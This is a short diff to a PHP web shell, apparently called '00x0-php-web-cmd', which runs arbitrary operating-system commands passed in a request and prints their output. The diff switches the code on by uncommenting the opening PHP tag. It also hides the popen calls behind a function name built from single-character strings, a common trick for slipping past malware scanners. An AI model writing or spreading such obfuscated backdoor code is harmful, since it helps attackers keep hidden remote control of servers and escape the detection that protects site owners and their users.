@@ -1,4 +1,4 @@
-#<?php
+<?php
 /*******************************************************************************
  * Copyright 2022 00x0-php-web-cmd
  * 
@@ -278,11 +278,13 @@ if (! empty($cmd))
 	echo "</b>\n";
 	if (DIRECTORY_SEPARATOR == '/')
 	{
-		$p = popen('exec 2>&1; ' . $cmd, 'r');
+		$myp = 'p'.'o'.'p'.'e'.'n';
+		$p = $myp('exec 2>&1; ' . $cmd, 'r');
 	}
 	else
 	{
-		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
+		$myp = 'p'.'o'.'p'.'e'.'n';
+		$p = $myp('cmd /C "' . $cmd . '" 2>&1', 'r');
 	}
 	while (! feof($p))
 	{
